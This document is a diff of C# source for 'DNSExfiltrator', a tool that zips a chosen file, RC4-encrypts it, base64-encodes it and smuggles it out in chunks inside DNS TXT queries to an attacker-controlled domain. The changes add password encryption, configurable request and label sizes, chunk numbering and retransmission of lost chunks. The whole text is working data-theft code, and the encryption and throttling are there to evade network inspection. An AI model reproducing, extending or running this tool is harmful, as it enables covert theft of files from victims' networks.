@@ -28,25 +28,19 @@ namespace DNSExfiltrator
 	public class DNSExfiltrator
 	{	
 		//------------------------------------------------------------------------------------
-		// Split a string in a number of fixed size chunks
-		//------------------------------------------------------------------------------------
-		private static System.Collections.Generic.IEnumerable<string> SplitInChunks(string str, int maxChunkSize)
-		{
-			for (int i = 0; i < str.Length; i += maxChunkSize) 
-				yield return str.Substring(i, Math.Min(maxChunkSize, str.Length-i));
-		}
-		
-		//------------------------------------------------------------------------------------
 		// Print usage
 		//------------------------------------------------------------------------------------
 		private static void PrintUsage()
 		{
 			Console.WriteLine("Usage:");
-			Console.WriteLine("{0} <file> <domainName> [s=DNS_server] [t=throttleTime]", System.AppDomain.CurrentDomain.FriendlyName);
+			Console.WriteLine("{0} <file> <domainName> <password> [s=DNS_server] [t=throttleTime] [r=requestMaxSize] [l=labelMaxSize]", System.AppDomain.CurrentDomain.FriendlyName);
 			Console.WriteLine("\tfile:\t\t[MANDATORY] The file name to the file to be exfiltrated.");
 			Console.WriteLine("\tdomainName:\t[MANDATORY] The domain name to use for DNS requests.");
+			Console.WriteLine("\tpassword:\t[MANDATORY] Password used to encrypt the data to be exfiltrated.");
 			Console.WriteLine("\tDNS_Server:\t[OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.");
 			Console.WriteLine("\tthrottleTime:\t[OPTIONNAL] The time in milliseconds to wait between each DNS request.");
+			Console.WriteLine("\trequestMaxSize:\t[OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes.");
+			Console.WriteLine("\tlabelMaxSize:\t[OPTIONNAL] The maximum size in chars for each DNS request label (subdomain). Defaults to 63 chars.");
 		}
 		
 		//------------------------------------------------------------------------------------
@@ -84,19 +78,31 @@ namespace DNSExfiltrator
 		//------------------------------------------------------------------------------------
         public static void Main(string[] args)
         {
+			// Variables
+			string filePath = String.Empty;
+			string domainName = String.Empty;
+			string password = String.Empty;
+
+			string fileName = String.Empty;
+			string dnsServer = null;
+			int throttleTime = 0;
+			string data = String.Empty;
+			string request = String.Empty;
+			int requestMaxSize = 255; // DNS request max size = 255 bytes
+			int labelMaxSize = 63; // DNS request label max size = 63 chars
+			
 			//--------------------------------------------------------------
 			// Perform arguments checking
-			if(args.Length < 2) {
+			if(args.Length < 3) {
 				PrintColor("[!] Missing arguments");
 				PrintUsage();
 				return;
 			}
 			
-			string filePath = args[0];
-			string domainName = args[1];
-			string fileName = Path.GetFileName(filePath);
-			string dnsServer = null;
-			int throttleTime = 0;
+			filePath = args[0];
+			domainName = args[1];
+			password = args[2];
+			fileName = Path.GetFileName(filePath);
 			
 			if (!File.Exists(filePath)) {
 				PrintColor(String.Format("[!] File not found: {0}",filePath));
@@ -104,8 +110,9 @@ namespace DNSExfiltrator
 			}
 			
 			// Do we have additionnal arguments ?
-			if (new[] {3, 4}.Contains(args.Length)) {
-				int i = 2;
+			if (new[] {4, 5, 6, 7}.Contains(args.Length)) {
+				int i = 3;
+				int param;
 				while (i < args.Length) {
 					if (args[i].StartsWith("s=")) {
 						dnsServer = args[i].Split('=')[1];
@@ -113,17 +120,25 @@ namespace DNSExfiltrator
 					}
 					else if (args[i].StartsWith("t=")) {
 						throttleTime = Convert.ToInt32(args[i].Split('=')[1]);
-						PrintColor(String.Format("[*] Setting throttle time to [{0}ms]", throttleTime));
+						PrintColor(String.Format("[*] Setting throttle time to [{0}] ms", throttleTime));
+					}
+					else if (args[i].StartsWith("r=")) {
+						param = Convert.ToInt32(args[i].Split('=')[1]);
+						if (param < 255) { requestMaxSize = param; }
+						PrintColor(String.Format("[*] Setting DNS request max size to [{0}] bytes", requestMaxSize));
+					}
+					else if (args[i].StartsWith("l=")) {
+						param = Convert.ToInt32(args[i].Split('=')[1]);
+						if (param < 63) { labelMaxSize = param; }
+						PrintColor(String.Format("[*] Setting label max size to [{0}] chars", labelMaxSize));
 					}
 					i++;
 				}
 			}
 			
-			string data = String.Empty;
-			
 			//--------------------------------------------------------------
 			// Compress the file in memory
-			PrintColor(String.Format("[*] Compressing (zip) the [{0}] file in memory",filePath));
+			PrintColor(String.Format("[*] Compressing (ZIP) the [{0}] file in memory",filePath));
 			using (var zipStream = new MemoryStream())
 			{
 				using (var archive = new ZipArchive(zipStream, ZipArchiveMode.Create, true))
@@ -137,29 +152,30 @@ namespace DNSExfiltrator
 				}
 
 				zipStream.Seek(0, SeekOrigin.Begin);
-				PrintColor("[*] Converting the zipped file to a base64 representation");
-				data = Encode(zipStream.ToArray());
+				PrintColor(String.Format("[*] Encrypting the ZIP file with password [{0}], then converting it to a base64 representation",password));
+				data = Encode(RC4Encrypt.Encrypt(Encoding.UTF8.GetBytes(password),zipStream.ToArray()));
 				PrintColor(String.Format("[*] Total size of data to be transmitted: [{0}] bytes", data.Length));
 			}
 			
 			//--------------------------------------------------------------
 			// Compute the size of the chunk and how it can be split into subdomains (labels)
-			// Rationnal: DNS request max size is 255 bytes, each label max size is 63 chars => 64 bytes due to the byte required to code the label length
 			// https://blogs.msdn.microsoft.com/oldnewthing/20120412-00/?p=7873
-			int bytesLeft = 255 - (domainName.Length+2); // domain name space usage in bytes
-			int nbFullLabels = bytesLeft/64;
-			int smallestLabelSize = bytesLeft%64 - 1;
-			int chunkMaxSize = nbFullLabels*63 + smallestLabelSize;
+
+			// The bytes available to exfiltrate actual data, keeping 10 bytes to transmit the chunk number:
+			// <chunk_number>.<data>.<data>.<data>.domainName.
+			int bytesLeft = requestMaxSize - 10 - (domainName.Length+2); // domain name space usage in bytes
+			
+			int nbFullLabels = bytesLeft/(labelMaxSize+1);
+			int smallestLabelSize = bytesLeft%(labelMaxSize+1) - 1;
+			int chunkMaxSize = nbFullLabels*labelMaxSize + smallestLabelSize;
 			int nbChunks = data.Length/chunkMaxSize + 1;
-			PrintColor(String.Format("[+] Chunk max size: [{0}] bytes", chunkMaxSize));
+			PrintColor(String.Format("[+] Maximum data exfiltrated per DNS request (chunk max size): [{0}] bytes", chunkMaxSize));
 			PrintColor(String.Format("[+] Number of chunks: [{0}]", nbChunks));
 			
 			//--------------------------------------------------------------
 			// Send the initial request advertising the fileName and the total number of chunks
-			string request = String.Empty;
-			
 			request = "init." + Encode(Encoding.UTF8.GetBytes(String.Format("{0}|{1}",fileName, nbChunks))) + "." + domainName;
-			PrintColor("[*] Sending init request");
+			PrintColor("[*] Sending 'init' request");
 			try {
 				string[] reply = DnsResolver.GetTXTRecords(request,dnsServer);
 				if (reply[0] != "OK") {
@@ -174,39 +190,48 @@ namespace DNSExfiltrator
 			
 			//--------------------------------------------------------------
 			// Send all chunks of data, one by one
+			PrintColor("[*] Sending data...");
+			
 			string chunk = String.Empty;
-			int count = 1;
+			int chunkIndex = 0;
 			int countACK;
 			
-			for (int i = 0; i < data.Length; i += chunkMaxSize) {
-				request = String.Empty;
-				
+			for (int i = 0; i < data.Length;) {
 				// Get a first chunk of data to send
 				chunk = data.Substring(i, Math.Min(chunkMaxSize, data.Length-i));
 				int chunkLength = chunk.Length;
 
+				// First part of the request is the chunk number
+				request = chunkIndex.ToString() + ".";
+				
+				// Then comes the chunk data, split into sublabels
 				int j = 0;
-				while (j*63 < chunkLength) {
-					request += chunk.Substring(j*63, Math.Min(63, chunkLength-(j*63))) + ".";
+				while (j*labelMaxSize < chunkLength) {
+					request += chunk.Substring(j*labelMaxSize, Math.Min(labelMaxSize, chunkLength-(j*labelMaxSize))) + ".";
 					j++;
 				}
 
+				// Eventually comes the top level domain name
 				request += domainName;
 				
-				// Now send the request
+				
+				// Send the request
 				try {
 					string[] reply = DnsResolver.GetTXTRecords(request,dnsServer);
 					countACK = Convert.ToInt32(reply[0]);
 					
-					if (countACK != count) {
-						PrintColor(String.Format("[!] Chunk number [{0}] lost !!", countACK));
+					if (countACK != chunkIndex) {
+						PrintColor(String.Format("[!] Chunk number [{0}] lost.\nResending.", countACK));
+					}
+					else {
+						i += chunkMaxSize;
+						chunkIndex++;
 					}
 				}
 				catch (Win32Exception e) {
 					PrintColor(String.Format("[!] Unexpected exception occured: [{0}]",e.Message));
 					return;
 				}
-				count++;
 				
 				// Apply throttle if requested
 				if (throttleTime != 0) {
@@ -218,7 +243,56 @@ namespace DNSExfiltrator
 		} // End Main
 		
 	}
-		
+	
+	//============================================================================================
+	// This class provides RC4 encryption functions
+	// https://bitlush.com/blog/rc4-encryption-in-c-sharp
+	//============================================================================================
+	public class RC4Encrypt
+	{
+		public static byte[] Encrypt(byte[] key, byte[] data)
+		{
+			return EncryptOutput(key, data).ToArray();
+		}
+
+		private static byte[] EncryptInitalize(byte[] key)
+		{
+			byte[] s = Enumerable.Range(0, 256)
+			.Select(i => (byte)i)
+			.ToArray();
+
+			for (int i = 0, j = 0; i < 256; i++) {
+				j = (j + key[i % key.Length] + s[i]) & 255;
+				Swap(s, i, j);
+			}
+
+			return s;
+		}
+   
+		private static System.Collections.Generic.IEnumerable<byte> EncryptOutput(byte[] key, System.Collections.Generic.IEnumerable<byte> data)
+		{
+				byte[] s = EncryptInitalize(key);
+				int i = 0;
+				int j = 0;
+
+				return data.Select((b) =>
+				{
+					i = (i + 1) & 255;
+					j = (j + s[i]) & 255;
+					Swap(s, i, j);
+
+					return (byte)(b ^ s[(s[i] + s[j]) & 255]);
+				});
+		}
+
+		private static void Swap(byte[] s, int i, int j)
+		{
+			byte c = s[i];
+			s[i] = s[j];
+			s[j] = c;
+		}
+	}	
+
 	//============================================================================================
 	// This class provides DNS resolution by using the PInvoke calls to the native Win32 API
 	//============================================================================================
